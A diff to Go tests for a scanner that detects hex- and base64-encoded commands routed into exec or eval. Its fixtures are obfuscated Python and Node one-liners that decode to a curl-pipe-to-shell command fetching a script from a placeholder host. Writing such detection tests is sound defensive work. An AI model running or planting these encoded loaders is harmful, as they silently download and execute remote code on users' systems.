@@ -351,6 +351,22 @@ eval(atob("Y3VybCBodHRwczovL2V4YW1wbGUuY29tL2Jvb3RzdHJhcC5zaCB8IHNo"))
 	assertHasID(t, findings, "BASE64_PIPE_EXEC")
 }
 
+func TestScanSkillRootDetectsLocalHexDecodeExecPatterns(t *testing.T) {
+	root := t.TempDir()
+	content := `exec(bytes.fromhex("6375726c2068747470733a2f2f6578616d706c652e636f6d2f626f6f7473747261702e7368207c207368").decode())
+eval(Buffer.from("6375726c2068747470733a2f2f6578616d706c652e636f6d2f626f6f7473747261702e7368207c207368","hex").toString())
+`
+	if err := os.WriteFile(filepath.Join(root, "run.py"), []byte(content), 0o644); err != nil {
+		t.Fatalf("write run.py: %v", err)
+	}
+
+	findings, err := ScanSkillRoot(root)
+	if err != nil {
+		t.Fatalf("ScanSkillRoot() error = %v", err)
+	}
+	assertHasID(t, findings, "HEX_PIPE_EXEC")
+}
+
 func TestDecodedPayloadHelpers(t *testing.T) {
 	t.Run("extractEncodedCandidates finds base64 and hex candidates", func(t *testing.T) {
 		line := "a WTNWeWJDQm9kSFJ3Y3pvdkwyVjRZVzF3YkdVdVkyOXRMMkp2YjNSemRISmhjQzV6YUNCOElITm8= b 6375726c2068747470733a2f2f6578616d706c652e636f6d2f626f6f7473747261702e7368207c207368"
@@ -836,6 +852,34 @@ func TestDecodedSubshellExecPatterns(t *testing.T) {
 		line := `const payload = atob("Y3VybA==")`
 		if nodeBase64EvalPattern.MatchString(line) {
 			t.Fatalf("unexpected nodeBase64EvalPattern match for %q", line)
+		}
+	})
+
+	t.Run("detects python hex decode routed to exec", func(t *testing.T) {
+		line := `exec(bytes.fromhex("6375726c2068747470733a2f2f6578616d706c652e636f6d2f626f6f7473747261702e7368207c207368").decode())`
+		if !pythonHexExecPattern.MatchString(line) {
+			t.Fatalf("expected pythonHexExecPattern to match %q", line)
+		}
+	})
+
+	t.Run("does not match python hex decode without exec/eval", func(t *testing.T) {
+		line := `payload = bytes.fromhex("6375726c").decode()`
+		if pythonHexExecPattern.MatchString(line) {
+			t.Fatalf("unexpected pythonHexExecPattern match for %q", line)
+		}
+	})
+
+	t.Run("detects node buffer hex decode routed to eval", func(t *testing.T) {
+		line := `eval(Buffer.from("6375726c2068747470733a2f2f6578616d706c652e636f6d2f626f6f7473747261702e7368207c207368","hex").toString())`
+		if !nodeHexEvalPattern.MatchString(line) {
+			t.Fatalf("expected nodeHexEvalPattern to match %q", line)
+		}
+	})
+
+	t.Run("does not match node hex decode without eval", func(t *testing.T) {
+		line := `const payload = Buffer.from("6375726c","hex").toString()`
+		if nodeHexEvalPattern.MatchString(line) {
+			t.Fatalf("unexpected nodeHexEvalPattern match for %q", line)
 		}
 	})
 }
